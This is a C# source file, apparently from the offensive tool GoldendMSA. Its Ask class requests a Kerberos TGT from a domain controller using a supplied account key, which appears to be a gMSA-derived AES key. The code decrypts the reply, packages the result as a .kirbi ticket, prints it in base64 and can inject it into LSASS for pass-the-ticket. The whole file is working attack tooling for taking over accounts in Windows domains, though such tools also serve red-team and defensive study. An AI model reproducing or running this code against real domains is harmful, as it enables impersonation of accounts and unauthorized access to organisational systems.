using System;
using Asn1;
using Cryptography;
using GoldendMSA.lib;

namespace GoldendMSA
{
    public class Ask
    {
        public static byte[] Tgt(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool ptt,
            Interop.KERB_ETYPE suppEtype, bool verbose = false)
        {
            var userHashAsreq = AS_REQ.NewASReq(userName, domain, keyString, etype, suppEtype);
            return InnerTgt(userHashAsreq, etype, ptt, domain, verbose);
        }

        private static byte[] InnerTgt(AS_REQ asReq, Interop.KERB_ETYPE etype, bool ptt, string domain = "",
            bool verbose = false, bool opsec = false)
        {
            byte[] response = null;
            string dcIp = null;


            dcIp = LdapUtils.GetDomainControllerInfoAlt(domain).ip;
            if (string.IsNullOrEmpty(dcIp)) throw new Exception("[X] Unable to get domain controller address");
            if (verbose) Console.WriteLine("");
            response = Helpers.SendBytes(dcIp, 88, asReq.Encode().Encode());

            if (response == null) throw new Exception("[X] No answer from domain controller");

            // decode the supplied bytes to an AsnElt object
            AsnElt responseAsn;
            try
            {
                responseAsn = AsnElt.Decode(response);
            }
            catch (Exception e)
            {
                throw new Exception(
                    $"Error parsing response AS-REQ: {e}.  Base64 response: {Convert.ToBase64String(response)}");
            }

            // check the response value
            var responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                if (verbose) Console.WriteLine("[+] TGT request successful!");

                var kirbiBytes = HandleAsrep(responseAsn, etype, asReq.keyString, ptt, verbose, asReq, dcIp);

                return kirbiBytes;
            }

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                var error = new KRB_ERROR(responseAsn.Sub[0]);

                throw error;
            }

            throw new Exception("[X] Unknown application tag: " + responseTag);
        }


        private static byte[] HandleAsrep(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, bool ptt,
            bool verbose = false, AS_REQ asReq = null, string dcIp = "")
        {
            var luid = new LUID();
            var rep = new AS_REP(responseAsn);

            byte[] key;

            key = Helpers.StringToByteArray(keyString);


            if (rep.enc_part.etype != (int)etype)
                Console.WriteLine(
                    $"[!] Warning: Supplied encyption key type is {etype} but AS-REP contains data encrypted with {(Interop.KERB_ETYPE)rep.enc_part.etype}");


            byte[] outBytes;

            if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
                outBytes = CryptoActions.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key,
                    rep.enc_part.cipher);
            else
                throw new Exception("[X] Encryption type \"" + etype + "\" not currently supported");

            AsnElt ae = null;
            var decodeSuccess = false;
            try
            {
                ae = AsnElt.Decode(outBytes, false);
                if (ae.TagValue == 25) decodeSuccess = true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error parsing encrypted part of AS-REP: " + ex.Message);
            }

            if (!decodeSuccess)
            {
                Console.WriteLine(
                    "[X] Failed to decrypt TGT using supplied password/hash. If this TGT was requested with no preauth then the password supplied may be incorrect or the data was encrypted with a different type of encryption than expected");
                return null;
            }

            var encRepPart = new EncKDCRepPart(ae.Sub[0]);

            var cred = new KRB_CRED();

            cred.tickets.Add(rep.ticket);


            var info = new KrbCredInfo();

            info.key.keytype = encRepPart.key.keytype;
            info.key.keyvalue = encRepPart.key.keyvalue;

            info.prealm = encRepPart.realm;

            info.pname.name_type = rep.cname.name_type;
            info.pname.name_string = rep.cname.name_string;

            info.flags = encRepPart.flags;


            info.starttime = encRepPart.starttime;

            info.endtime = encRepPart.endtime;

            info.renew_till = encRepPart.renew_till;

            info.srealm = encRepPart.realm;

            info.sname.name_type = encRepPart.sname.name_type;
            info.sname.name_string = encRepPart.sname.name_string;

            cred.enc_part.ticket_info.Add(info);

            var kirbiBytes = cred.Encode().Encode();
            var kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine("[*] base64(ticket.kirbi):", kirbiString);
            Console.WriteLine("      {0}", kirbiString);
            Console.WriteLine("");

            if (ptt || luid != 0)
                // pass-the-ticket -> import into LSASS
                Lsa.ImportTicket(kirbiBytes, luid);
            return kirbiBytes;
        }
    }
}